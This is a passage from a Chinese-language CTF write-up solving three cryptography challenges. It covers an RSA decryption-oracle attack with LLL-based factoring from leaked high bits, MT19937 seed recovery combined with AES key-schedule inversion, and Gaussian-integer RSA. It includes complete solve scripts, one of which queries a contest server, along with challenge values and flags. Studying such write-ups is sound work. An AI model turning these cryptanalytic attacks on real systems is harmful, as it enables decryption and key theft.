N^(m-i) * f(xX)^i               for i = 0..m-1
(xX)^j * f(xX)^m                for j = 0..t-1
```

将这些多项式的系数作为格基，LLL 约简后会得到一个较短的整数多项式 `g(x)`。如果参数满足 Howgrave\-Graham 条件，则真实小根 `x0` 会成为整数根：

```text
g(x0) = 0 over Z
```

解题脚本

```python
import json
import math
import re
import socket
from pathlib import Path

import flint
import sympy as sp
from Crypto.Util.number import long_to_bytes

HOST = "114.66.24.210"
PORT = 21587

P_BITS = 512
LEAK_BITS = 256
BRUTE_BITS = 8
LOW_BITS = P_BITS - LEAK_BITS - BRUTE_BITS
E = 65537

def recv_until(sock, marker, timeout=10):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return data

def sendline(sock, value):
    sock.sendall(str(value).encode() + b"\n")

def collect_instance(path="remote_instance.json"):
    sock = socket.create_connection((HOST, PORT), timeout=10)
    recv_until(sock, b"Select action > ")
    sendline(sock, 2)
    text = recv_until(sock, b"Select action > ").decode("utf-8", "replace")
    vals = {k: int(v) for k, v in re.findall(r"^(n|e|c_hint|c) = (\d+)$", text, re.M)}

    n = vals["n"]
    c_hint = vals["c_hint"]
    inv2e = pow(pow(2, -1, n), vals["e"], n)
    mult = 1
    p_high = 0
    leaks = []

    for i in range(LEAK_BITS):
        sendline(sock, 1)
        recv_until(sock, b"ciphertext >>> ")
        sendline(sock, (c_hint * mult) % n)
        resp = recv_until(sock, b"Select action > ")
        match = re.search(rb"bit = ([01])", resp)
        if not match:
            raise RuntimeError(resp.decode("utf-8", "replace"))

        leak = int(match.group(1))
        # m_i = floor((p_high + k*n) / 2^i), where k makes p_high+k*n divisible by 2^i.
        k = (-p_high * pow(n, -1, 1 << i)) % (1 << i) if i else 0
        carry_bit = ((p_high + k * n) >> i) & 1
        bit = leak ^ carry_bit
        p_high |= bit << i
        leaks.append(leak)
        mult = (mult * inv2e) % n

        if (i + 1) % 32 == 0:
            print(f"oracle: recovered {i + 1}/{LEAK_BITS} bits", flush=True)

    vals["p_high"] = p_high
    vals["leak_bits"] = leaks
    vals["p_high_verified"] = pow(p_high, vals["e"], n) == c_hint
    Path(path).write_text(json.dumps(vals, indent=2), encoding="utf-8")
    try:
        sendline(sock, 3)
    finally:
        sock.close()
    return vals

def poly_mul(a, b):
    out = [0] * (len(a) + len(b) - 1)
    for i, x in enumerate(a):
        if x:
            for j, y in enumerate(b):
                if y:
                    out[i + j] += x * y
    return out

def poly_pow(base, exponent):
    out = [1]
    while exponent:
        if exponent & 1:
            out = poly_mul(out, base)
        base = poly_mul(base, base)
        exponent >>= 1
    return out

def build_hg_basis(n, a, x_bound, m, t):
    # Howgrave-Graham univariate basis for monic f(x)=x+a, with f(root) == 0 mod p.
    dim = m + t
    rows = []
    f_x = [a, x_bound]  # f(x * X)

    for i in range(m):
        coeff = [c * pow(n, m - i) for c in poly_pow(f_x, i)]
        coeff += [0] * (dim - len(coeff))
        rows.append(coeff[:dim])

    f_m = poly_pow(f_x, m)
    for j in range(t):
        coeff = [0] * j + [c * pow(x_bound, j) for c in f_m]
        coeff += [0] * (dim - len(coeff))
        rows.append(coeff[:dim])

    return rows

def flint_lll(rows):
    mat = flint.fmpz_mat(rows)
    red = mat.lll()
    return [[int(red[i, j]) for j in range(red.ncols())] for i in range(red.nrows())]

def eval_poly(coeffs, x):
    value = 0
    for c in reversed(coeffs):
        value = value * x + c
    return value

def row_roots(row, x_bound):
    coeffs = [int(v) // pow(x_bound, i) for i, v in enumerate(row)]
    while len(coeffs) > 1 and coeffs[-1] == 0:
        coeffs.pop()
    if not coeffs or all(c == 0 for c in coeffs):
        return []

    roots = roots_by_crt(coeffs, x_bound)
    if roots:
        return roots

    x = sp.Symbol("x")
    poly = sp.Poly(sum(c * x**i for i, c in enumerate(coeffs)), x, domain=sp.ZZ)
    candidates = set()
    try:
        for root in poly.ground_roots():
            candidates.add(int(root))
    except Exception:
        pass

    return [r for r in candidates if 0 <= r < x_bound]

def roots_mod_prime(coeffs, prime):
    coeffs_mod = [c % prime for c in coeffs]
    if all(c == 0 for c in coeffs_mod):
        return None

    roots = []
    for x in range(prime):
        value = 0
        for c in reversed(coeffs_mod):
            value = (value * x + c) % prime
        if value == 0:
            roots.append(x)
    return roots

def crt_pair(a, m, b, n):
    return (a + ((b - a) * pow(m, -1, n) % n) * m) % (m * n)

def roots_by_crt(coeffs, x_bound):
    # Factor-free integer root recovery. If g(x0)=0 over Z, then x0 mod p
    # is a root modulo every small prime p. CRT until the modulus exceeds X.
    primes = [
        1009,
        1013,
        1019,
        1021,
        1031,
        1033,
        1039,
        1049,
        1051,
        1061,
        1063,
        1069,
        1087,
        1091,
        1093,
        1097,
        1103,
        1109,
        1117,
        1123,
        1129,
        1151,
        1153,
        1163,
        1171,
        1181,
        1187,
        1193,
        1201,
        1213,
        1217,
        1223,
        1229,
        1231,
        1237,
        1249,
        1259,
        1277,
        1279,
        1283,
        1289,
        1291,
        1297,
        1301,
        1303,
        1307,
        1319,
        1321,
    ]

    residues = [(0, 1)]
    for prime in primes:
        roots = roots_mod_prime(coeffs, prime)
        if roots is None:
            continue
        if not roots:
            return []

        next_residues = []
        for residue, modulus in residues:
            for root in roots:
                next_residues.append((crt_pair(residue, modulus, root, prime), modulus * prime))

        # Keep the search bounded if a non-candidate polynomial has many roots.
        if len(next_residues) > 256:
            return []
        residues = next_residues

        if residues and residues[0][1] > x_bound:
            out = []
            for residue, modulus in residues:
                if residue < x_bound and eval_poly(coeffs, residue) == 0:
                    out.append(residue)
            return out

    return []

def factor_with_known_high(n, p_high, m=18, t=19):
    x_bound = 1 << LOW_BITS
    shift = BRUTE_BITS + LOW_BITS
    prefix = p_high << shift

    for middle in range(1 << BRUTE_BITS):
        base = prefix | (middle << LOW_BITS)
        # Use f(x)=x+base, but make the constant small modulo n for shorter entries.
        a = base % n
        rows = build_hg_basis(n, a, x_bound, m, t)
        print(f"LLL middle={middle:02x} dim={m + t}", flush=True)
        reduced = flint_lll(rows)

        for row_index, row in enumerate(reduced[: min(20, len(reduced))]):
            for root in row_roots(row, x_bound):
                p = base + root
                if 1 < p < n and n % p == 0:
                    return p, n // p, middle, root, row_index

            # Root extraction can fail on large coefficients. A gcd of row(base+x)
            # at a true integer root is the only thing we need, so try numerical
            # roots only after exact methods above.
        if middle % 16 == 15:
            print(f"tried {middle + 1}/256 middle-byte candidates", flush=True)

    raise RuntimeError("factor not found")

def decrypt_flag(vals):
    n = vals["n"]
    e = vals.get("e", E)
    p_high = vals["p_high"]
    p, q, middle, root, row_index = factor_with_known_high(n, p_high)
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(vals["c"], d, n)
    flag = long_to_bytes(m)
    print(f"p middle byte = 0x{middle:02x}")
    print(f"root bits = {root.bit_length()}, LLL row = {row_index}")
    print(flag)
    return flag

def main():
    path = Path("remote_instance.json")
    if path.exists():
        vals = json.loads(path.read_text(encoding="utf-8"))
    else:
        vals = collect_instance(path)

    if not vals.get("p_high_verified", False):
        assert pow(vals["p_high"], vals["e"], vals["n"]) == vals["c_hint"]
    decrypt_flag(vals)

if __name__ == "__main__":
    main()

```

![Image](./images/img-114.png)

H\&NCTF\{rsa\_pro\_6b483fb008c1\_4d391e90\-7c98\-41da\-996a\-fa016a38b4ab\}







## 题目名称：mt\&对称

解题人：weixiao

解题思路：

题目提示：

```text
究竟mt劈了腿还是对称出了轨
```

连接后服务直接给出题目输出：

```text
n = ...
c_rsa = ...
iv = ...
c_aes = ...
outputs = [...]
```

**源码分析**

核心加密流程如下：

```python
random_key1 = os.urandom(16)
mt_seed = random_key1 + os.urandom(16)
random_key2 = os.urandom(16)

key = xor_bytes(random_key1, random_key2)
outputs = leak_with_mt19937(mt_seed)

last_key = key_expansion(random_key2)
c_rsa = pow(bytes_to_long(last_key), e, n)

iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
c_aes = cipher.encrypt(pad(flag, 16))
```

最终 AES\-CBC 的密钥是：

```python
key = random_key1 ^ random_key2
```

所以需要分别恢复 `random_key1` 和 `random_key2`。

**漏洞一：RSA 的 p 可重算**

`p` 的生成函数如下：

```python
def generate_prime(bits):
    while True:
        p_sub = 2
        for prime in sieve_base:
            p_sub *= prime
            if p_sub.bit_length() > bits - 2:
                break

        for k in range(2, 10000, 2):
            p = p_sub * k + 1
            if isPrime(p):
                return p
```

这里没有随机数参与，`bits = 1024` 时生成出来的 `p` 是固定的。因此本地重新运行 `generate_prime(1024)` 就能得到同一个 `p`，进而分解：

```python
p = generate_prime(1024)
q = n // p
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
```

RSA 解密 `c_rsa` 后得到的是 `random_key2` 的 AES 最后一轮轮密钥：

```python
last_round_key = pow(c_rsa, d, n)
```

**漏洞二：AES key schedule 可逆**

题目没有直接 RSA 加密 `random_key2`，而是加密：

```python
last_key = key_expansion(random_key2)
```

但是 AES\-128 key schedule 是可逆的。已知最后 4 个 word，即 `w[40] ~ w[43]`，可以倒推 `w[0] ~ w[3]`：

```python
for i in range(43, 3, -1):
    temp = w[i - 1]
    if i % 4 == 0:
        temp = SubWord(RotWord(temp)) ^ RCON[i // 4]
    w[i - 4] = w[i] ^ temp
```

这样即可恢复：

```python
random_key2 = invert_last_round_key(last_round_key)
```

**漏洞三：MT19937 seed 可由泄漏恢复**

`random_key1` 藏在 MT seed 的前 16 字节：

```python
mt_seed = random_key1 + os.urandom(16)
rng = random.Random(int.from_bytes(mt_seed, "big"))
```

泄漏函数：

```python
def leak_with_mt19937(seed):
    rng = random.Random(int.from_bytes(seed, "big"))
    return [rng.getrandbits(b"\x1e\x40\x20"[i % 3]) for i in range(300)]
```

也就是循环泄漏：

```text
30 bit, 64 bit, 32 bit
```

Python 的 `getrandbits(64)` 会消耗两个 32\-bit MT 输出，顺序为低 32 位在前、高 32 位在后；`getrandbits(30)` 等价于取一个 32\-bit 输出的高 30 位，低 2 位未知。

因此 300 次泄漏实际对应 400 个底层 MT 输出，其中 100 个输出缺低 2 bit。

本题 seed 是 256 bit，也就是 8 个 32\-bit word。利用 Python `random.seed(int)` 的初始化关系，只需要若干指定位置的 MT 状态即可恢复这 8 个 seed word。

做法：

1. 把 `outputs` 转成底层 32\-bit 输出。

2. 对缺失的低 2 bit 做小范围枚举。

3. 对完整输出做 untemper，恢复部分 MT state。

4. 用 MT twist 逆步骤恢复初始化中间状态。

5. 倒推 Python seed array，得到 8 个 32\-bit seed word。

6. 重新生成 300 个泄漏值做校验。

恢复出 `mt_seed` 后：

```python
random_key1 = mt_seed.to_bytes(32, "big")[:16]
```

**解密流程**

得到两个 key 后：

```python
key = random_key1 ^ random_key2
flag = AES.new(key, AES.MODE_CBC, iv).decrypt(c_aes)
flag = unpad(flag, 16)
```

重要的值

```c++
Welcome to H&NCTF MT19937 Crypto Challenge

n = 122328946052374997795187654565513152572537202181535898700682716855541382301149256170895670686649592245152648865087225627442684784266362881654296563606160773007588558458022873224700800681342589637129057356947686250991986527179659456640309399063235434614347033395937474164626253121890729556711314086713201114313490903746757103048406425112582857773918850199811857430657015790555922841951256226504299054077485543232089911995003300758375215995597525466824786340685980058935510189274753311971130782655420492727131838577523117273763108711440513316910634445499162239501314961351054834101453257727332071613894712128415522119560401
c_rsa = 35450867262530891550846313956684388353885097074473061142159068651126976198520201043374443483546187562471753564228742638077005375511108482974308714106012386430912316186927891521880613293767493257544896925310386727958194132894606930057616700787083211780435206048392035498674251223409746404847629463172193156807082555115919640752542491521269091767509713565458305890224371742611205522396279598517837085230077609365894910593508843729363557670362572146783605823964170209493883120272479560976858717864459860074216025174382075360998829968043297713848412373966109698799391474496585241936748953187235465147485548441391564382164544
iv = 189f388a72866c705e8034ee4142b9bd
c_aes = 4729ade95261397f0b20fc0dc7bb186f0c99d7965012df98f80ba273627793aadaefc7fa4490ecdc33cee90b06ceabcf
outputs = [138990732, 9090576148757485552, 460877203, 856078584, 17425671588525704008, 107778594, 758811008, 3462531309200622121, 2322819397, 556723846, 6545271496935706823, 1577480868, 231877437, 17493206404987857918, 3377533680, 566541515, 5734585040571697770, 3843113944, 931016716, 13944811090124645883, 521835002, 110462131, 4209894731200399838, 2809749939, 288799435, 14854490576854381664, 1236166099, 428470787, 9458113379352556658, 84626551, 732626221, 13933269012130919389, 3368317831, 805013236, 6709885159853953119, 1461522787, 130953920, 15937887443238327098, 1879289049, 1006465851, 4420537531530501342, 3468488398, 648502871, 3853609149472192360, 3580666371, 859612733, 3310123221045703953, 2645645350, 481361152, 16786694737791951452, 169897950, 680976281, 15448789995302269639, 827543517, 897241561, 4059573645821382035, 3206175142, 822494704, 13051015135091186759, 79682101, 425066137, 4595477557399304063, 2476603927, 586193988, 14284206269828509779, 2989891863, 233392808, 14916529330054829093, 1621173195, 92708071, 13988082711588423178, 2216773120, 1009497170, 5522842180106688623, 491281388, 735142929, 8201644043750799372, 1009757470, 756533466, 9056575765120001193, 25890531, 890339150, 14858928254604995826, 2349800254, 230215677, 8113396143104578519, 3840234998, 739715795, 10578820530768995102, 1575644775, 345203093, 15396347869925810652, 1717465552, 717075234, 2331104788200428767, 842216507, 111100625, 6351110493420255645, 1134747320, 616590692, 11625301497993018221, 2218629643, 583954969, 10400261237139501842, 2566746519, 402429681, 15217519845035808375, 2906017006, 653967151, 4657428479171786796, 2648702009, 758638815, 10840878459118519115, 1822156834, 106616480, 513448095687847722, 2832280106, 191240681, 529730659278852173, 4199949093, 613844463, 12923728627993024410, 3660464610, 1012193539, 11756314745813802054, 2516422582, 941323072, 5036890590360440495, 1506625310, 1047873119, 15224477868121080928, 2242695210, 720010524, 10801809308804776168, 792572143, 100205027, 13366025282539709760, 1064860096, 374751411, 14039416694230468193, 841064429, 925022347, 16245324708714643294, 1880103492, 524079986, 10900918278827851840, 175975975, 409872433, 1487620870362938840, 651388091, 329513889, 17918076893421852394, 1440061611, 992938103, 9564581059818667891, 3559467758, 617447687, 10170310895416158206, 903432663, 480455799, 6522783777337042604, 3667768854, 26375243, 12063551137512867827, 2520567180, 697866807, 7311048572340940711, 3057608672, 37007602, 7122390746089916603, 2444716216, 315156612, 2713222930157359050, 2800423137, 659318842, 10214511265602266247, 1017973484, 630364309, 5512520607391480260, 1739528941, 342701099, 13546067934452698973, 945237171, 694318758, 9717938363208252557, 812279794, 989879568, 13644044875671553129, 2888373101, 847299548, 13185948218832755264, 3044353278, 226959058, 5882274388309412143, 389747299, 593830548, 10363389611252808337, 3346233973, 11454647, 3432166127891833642, 405617297, 864272271, 9051546792378630431, 3457585527, 349553527, 10723474992148621285, 1389528768, 914673411, 16848303658016623796, 3960842615, 688097115, 8098285035735835550, 3075942953, 829982984, 14577327095786546043, 640122862, 210419553, 9008715327999309952, 323857679, 877786709, 6731491808107047306, 2840296329, 47203885, 10476837798865265520, 1499670483, 124074269, 7524929972716089401, 682131539, 764250669, 213773739710828382, 4273073250, 893720897, 391967662207859420, 3253454743, 557615319, 10132913570470768232, 295627583, 96324417, 18104110981249875426, 3958673382, 820956208, 15558896302349196187, 3018427473, 652568457, 11813092214449352189, 3840811132, 730075495, 17884319686022123171, 1361954128, 579217534, 15305148766808453854, 1952465569, 985834616, 3365029876853207809, 2720473227, 525381406, 3286053579125002736, 3094733245, 517960392, 46341596967447527, 369883989, 157415150, 17023150076961834669, 2670508421, 2091799, 4449163351534279755, 2932977490, 279393623, 7347019252646864153, 260589531, 925118404, 1024792196478395696, 2061569254, 105311636, 8863664051117417635, 100560898, 569669301, 5542813050693875292, 3788455265, 735420523, 10770070485674252497, 3444498803, 727388094, 13257991741421254760, 874168042, 62166651, 8145426974311854173, 1104378269, 881926870, 5711368896464114006, 3028173945, 1019292007, 4072316905862592268, 4024433818, 100135168, 3676963952812130848, 1809924195, 974559089, 849951835564579236, 2484243640]

```

解题脚本

```python
import ast
import itertools
import sys
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes, sieve_base

MASK32 = 0xFFFFFFFF

SBOX = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
]
RCON = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def rot_word(word):
    return word[1:] + word[:1]

def sub_word(word):
    return bytes(SBOX[x] for x in word)

def schedule_g(word, round_id):
    word = bytearray(sub_word(rot_word(word)))
    word[0] ^= RCON[round_id]
    return bytes(word)

def invert_last_round_key(last_round_key):
    words = [None] * 44
    for i in range(4):
        words[40 + i] = last_round_key[4 * i:4 * i + 4]

    for i in range(43, 3, -1):
        temp = words[i - 1]
        if i % 4 == 0:
            temp = schedule_g(temp, i // 4)
        words[i - 4] = xor_bytes(words[i], temp)

    return b"".join(words[:4])

def generate_prime(bits):
    while True:
        p_sub = 2
        for prime in sieve_base:
            p_sub *= prime
            if p_sub.bit_length() > bits - 2:
                break

        for k in range(2, 10000, 2):
            p = p_sub * k + 1
            if isPrime(p):
                return p

def undo_right_xor(value, shift):
    result = value
    for _ in range(32):
        result = value ^ (result >> shift)
    return result & MASK32

def undo_left_xor(value, shift, mask):
    result = value
    for _ in range(32):
        result = value ^ ((result << shift) & mask)
    return result & MASK32

def untemper(value):
    value = undo_right_xor(value, 18)
    value = undo_left_xor(value, 15, 0xEFC60000)
    value = undo_left_xor(value, 7, 0x9D2C5680)
    value = undo_right_xor(value, 11)
    return value & MASK32

def invert_step(state_i, state_i_227):
    x = state_i ^ state_i_227
    low_bit = (x & 0x80000000) >> 31
    if low_bit:
        x ^= 0x9908B0DF
    x = (x << 1) & MASK32
    return x & 0x80000000, low_bit + (x & 0x7FFFFFFF)

def init_genrand(seed):
    mt = [0] * 624
    mt[0] = seed & MASK32
    for i in range(1, 624):
        mt[i] = (0x6C078965 * (mt[i - 1] ^ (mt[i - 1] >> 30)) + i) & MASK32
    return mt

INIT_MT = init_genrand(19650218)

def recover_kj_from_j_state(j_i, j_i_1, i):
    return (j_i - (INIT_MT[i] ^ ((j_i_1 ^ (j_i_1 >> 30)) * 1664525))) & MASK32

def recover_j_state_from_i_state(i_i, i_i_1, i):
    return ((i_i + i) ^ ((i_i_1 ^ (i_i_1 >> 30)) * 1566083941)) & MASK32

def recover_key_word_from_i_state(i_i, i_i_1, i_i_2, i):
    j_i = recover_j_state_from_i_state(i_i, i_i_1, i)
    j_i_1 = recover_j_state_from_i_state(i_i_1, i_i_2, i - 1)
    return recover_kj_from_j_state(j_i, j_i_1, i)

def mt_leak_from_seed(seed):
    import random

    rng = random.Random(seed)
    bit_sizes = (30, 64, 32)
    return [rng.getrandbits(bit_sizes[i % 3]) for i in range(300)]

def raw_outputs_from_leak(outputs):
    raw = []
    partial = []
    for i in range(100):
        out30, out64, out32 = outputs[3 * i:3 * i + 3]
        partial.append(len(raw))
        raw.append(out30 << 2)
        raw.append(out64 & MASK32)
        raw.append((out64 >> 32) & MASK32)
        raw.append(out32 & MASK32)
    return raw, set(partial)

def recover_mt_seed(outputs):
    raw, partial = raw_outputs_from_leak(outputs)

    needed = list(range(10)) + list(range(227, 237))
    missing_low_bits = [i for i in needed if i in partial]
    fixed = {i: raw[i] for i in needed if i not in partial}

    for low_bits in itertools.product(range(4), repeat=len(missing_low_bits)):
        values = dict(fixed)
        for index, bits in zip(missing_low_bits, low_bits):
            values[index] = raw[index] | bits

        states = {i: untemper(values[i]) for i in needed}
        lower = {}
        msb = {}
        for i in range(10):
            msb[i + 227], lower[i + 228] = invert_step(states[i], states[i + 227])

        i_state = {i: (lower[i] + msb[i]) & MASK32 for i in range(228, 237)}
        for top_bit in (0, 0x80000000):
            i_state[237] = lower[237] + top_bit
            key_words = [None] * 8
            ok = True
            for i in range(230, 238):
                key_index = (i - 1) % 8
                word = recover_key_word_from_i_state(i_state[i], i_state[i - 1], i_state[i - 2], i)
                word = (word - key_index) & MASK32
                if key_words[key_index] is not None and key_words[key_index] != word:
                    ok = False
                    break
                key_words[key_index] = word

            if ok and all(word is not None for word in key_words):
                seed = sum(word << (32 * i) for i, word in enumerate(key_words))
                if mt_leak_from_seed(seed) == outputs:
                    return seed

    raise ValueError("failed to recover MT seed")

def parse_output(text):
    parsed = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        value = value.strip()
        if key in {"n", "c_rsa"}:
            parsed[key] = int(value)
        elif key in {"iv", "c_aes"}:
            parsed[key] = bytes.fromhex(value)
        elif key == "outputs":
            parsed[key] = ast.literal_eval(value)

    missing = {"n", "c_rsa", "iv", "c_aes", "outputs"} - parsed.keys()
    if missing:
        raise ValueError(f"missing output fields: {', '.join(sorted(missing))}")
    return parsed

def solve(data):
    p = generate_prime(1024)
    if data["n"] % p != 0:
        raise ValueError("deterministic p is not a factor of n")

    q = data["n"] // p
    phi = (p - 1) * (q - 1)
    d = pow(65537, -1, phi)
    last_round_key = long_to_bytes(pow(data["c_rsa"], d, data["n"]), 16)
    random_key2 = invert_last_round_key(last_round_key)

    mt_seed = recover_mt_seed(data["outputs"])
    random_key1 = mt_seed.to_bytes(32, "big")[:16]

    key = xor_bytes(random_key1, random_key2)
    plaintext = AES.new(key, AES.MODE_CBC, data["iv"]).decrypt(data["c_aes"])
    return unpad(plaintext, 16)

def main():
    if len(sys.argv) > 1:
        text = Path(sys.argv[1]).read_text(encoding="utf-8")
    elif not sys.stdin.isatty():
        text = sys.stdin.read()
    else:
        raise SystemExit("usage: python solve.py output.txt")

    flag = solve(parse_output(text))
    print(flag.decode(errors="replace"))

if __name__ == "__main__":
    main()

```

```c++
python .\solve.py .\target_output_saved.txt
```

H\&NCTF\{d93c1685\-19a3\-4c18\-b667\-a45e8a3f7eb4\}

## 题目名称：rsa pro max

解题人：weixiao

解题过程：

题目实现的是 Gaussian integer 上的 RSA。代码中用二元组表示复整数：

```text
(a, b) <=> a + bi
```

对应的加法、乘法和 norm 为：

```text
(a + bi)(c + di) = (ac - bd) + (ad + bc)i
Norm(a + bi) = a^2 + b^2
```

题目生成两个 Gaussian prime：

```text
p, np = random_gaussian_prime(PRIME_BITS)
q, nq = random_gaussian_prime(PRIME_BITS)
```

其中 `np = Norm(p)`，`nq = Norm(q)`，并且 `np, nq` 都是满足 `1 mod 4` 的有理素数。

模数为：

```text
N = p * q
```

因此：

```text
Norm(N) = Norm(p) * Norm(q) = np * nq
```

这一步是本题的关键。不能直接把 `N = a + bi` 当成普通整数 RSA 模数，而是应该对 Gaussian integer 取 norm 后分解。

题目给出的参数为：

```text
e = 65537
base = 256
k = 16
S = (72, 117)
P = (97, 125)

N = (
    -285076339391714133886998989405561241005,
    -158629281313461832934731017808709616276
)

C = (
    43768499594212098138374344295509835882,
    25834506882323987292031095052053291634
)
```

根据脚本计算：

```text
normN = gnorm(N)
fac = factor(normN)
```

需要分解的整数是：

```text
106431768171005195056578309153304963000625696907332359069222316936790857518201
```

也就是：

```text
Norm(N) = N.real^2 + N.imag^2 = np * nq
```

分解得到 `np, nq` 后，就可以构造 Gaussian RSA 的解密指数。

**明文编码**

题目中 flag 长度满足：

```text
len(flag) == 2 * (K + 2)
```

由于：

```text
K = 16
```

所以：

```text
len(flag) = 36
half = 18
```

题目把 flag 分成前后两半：

```text
real = flag[:half]
imag = flag[half:]
```

然后按照小端形式编码成 Gaussian integer：

```text
m = sum((real[i] + imag[i] * i) * 256^i)
```

也就是说：

```text
M.real = real[0] + real[1] * 256 + ... + real[17] * 256^17
M.imag = imag[0] + imag[1] * 256 + ... + imag[17] * 256^17
```

题目还泄露了：

```text
S = (flag[0], flag[half])
P = (flag[half - 1], flag[-1])
```

即：

```text
flag[0]      = 72  = 'H'
flag[half]   = 117 = 'u'
flag[half-1] = 97  = 'a'
flag[-1]     = 125 = '}'
```

因为编码是小端，所以 `flag[half - 1]` 和 `flag[-1]` 分别是 `M.real` 和 `M.imag` 的最高字节。

因此可以得到范围：

```text
B17 = 256^17

97  * B17 <= M.real < 98  * B17
125 * B17 <= M.imag < 126 * B17
```

脚本中对应为：

```text
B17 = ZZ(BASE) ** (half - 1)

Lr, Ur = ZZ(P[0]) * B17, ZZ(P[0] + 1) * B17
Li, Ui = ZZ(P[1]) * B17, ZZ(P[1] + 1) * B17
```

**解密得到 residue**

分解 `Norm(N)` 得到 `np, nq` 后，可以构造：

```text
phi = lcm(np - 1, nq - 1)
d = inverse_mod(e, phi)
```

然后计算：

```text
R = gaussian_powmod(C, d, N)
```

这里得到的不是原始明文 `M`，而是：

```text
R ≡ M mod N
```

原因是题目中有：

```text
assert gnorm(M) > gnorm(N)
```

所以明文的 norm 大于模数的 norm。直接 Gaussian RSA 解密只能恢复模 `N` 意义下的剩余类，不能直接拿到原始 `M`。

**从 residue 提升回明文**

既然：

```text
R ≡ M mod N
```

那么存在 Gaussian integer：

```text
u + vi
```

使得：

```text
M = R + (u + vi)N
```

设：

```text
N = Nr + Ni*i
R = Rr + Ri*i
```

则：

```text
M.real = Rr + u * Nr - v * Ni
M.imag = Ri + u * Ni + v * Nr
```

脚本中就是利用这两个式子恢复 `u, v`。

由于我们已经知道 `M.real` 和 `M.imag` 的范围：

```text
Lr <= M.real < Ur
Li <= M.imag < Ui
```

先将矩形四个角反乘 `N^{-1}`，估计 `u` 的范围：

```text
def uv_from_xy(x, y):
    x -= Rr
    y -= Ri
    den = normN
    uu = QQ(x*Nr + y*Ni) / QQ(den)
    vv = QQ(-x*Ni + y*Nr) / QQ(den)
    return uu, vv

corners = [
    uv_from_xy(x, y)
    for x in (Lr, Ur-1)
    for y in (Li, Ui-1)
]

umin = floor(min(u for u, v in corners)) - 5
umax = ceil(max(u for u, v in corners)) + 5
```

然后枚举这个很小的 `u` 区间。

固定 `u` 后，由下面两个不等式分别求出 `v` 的范围：

```text
Lr <= Rr + u * Nr - v * Ni < Ur
Li <= Ri + u * Ni + v * Nr < Ui
```

脚本中通过 `add_ineq_for_v` 统一求解线性不等式：

```text
def add_ineq_for_v(lo, hi, const, coef):
    # lo <= const + coef*v < hi
    lo, hi, const, coef = map(ZZ, (lo, hi, const, coef))
    if coef > 0:
        return ceil_div(lo - const, coef), floor_div(hi - 1 - const, coef)
    else:
        return ceil_div(hi - 1 - const, coef), floor_div(lo - const, coef)
```

得到两个 `v` 区间后取交集：

```text
v1_lo, v1_hi = add_ineq_for_v(Lr, Ur, Rr + u*Nr, -Ni)
v2_lo, v2_hi = add_ineq_for_v(Li, Ui, Ri + u*Ni, Nr)

vlo, vhi = max(v1_lo, v2_lo), min(v1_hi, v2_hi)
```

如果交集非空，就枚举其中的 `v`，还原：

```text
Mr = Rr + u * Nr - v * Ni
Mi = Ri + u * Ni + v * Nr
```

然后检查最低字节是否匹配 `S`：

```text
